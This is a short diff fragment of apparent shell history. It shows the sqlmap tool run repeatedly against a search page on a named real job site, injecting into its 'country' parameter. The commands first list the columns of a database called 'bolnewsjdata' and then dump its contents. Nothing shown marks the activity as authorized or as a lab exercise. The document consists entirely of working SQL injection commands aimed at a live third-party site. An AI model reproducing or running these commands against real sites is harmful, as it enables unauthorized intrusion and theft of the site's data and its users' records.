@@ -1,0 +1,4 @@
+ python sqlmap.py -u "http://infosecgigs.com/index.php?action=advanced_search&page=advanced_search&keywords=&country=United+States&min_salary=&max_salary=&salary_type=&search_name=&save_search=0" --user-agent "Mozilla/5.0" -p country --technique eu --columns -D bolnewsjdata
+ 1622  cd tools/sqlmap-dev/
+ 1623  python sqlmap.py -u "http://infosecgigs.com/index.php?action=advanced_search&page=advanced_search&keywords=&country=United+States&min_salary=&max_salary=&salary_type=&search_name=&save_search=0" --user-agent "Mozilla/5.0" -p country --technique eu --columns -D bolnewsjdata
+ 1624  python sqlmap.py -u "http://infosecgigs.com/index.php?action=advanced_search&page=advanced_search&keywords=&country=United+States&min_salary=&max_salary=&salary_type=&search_name=&save_search=0" --user-agent "Mozilla/5.0" -p country --technique eu --dump -D bolnewsjdata
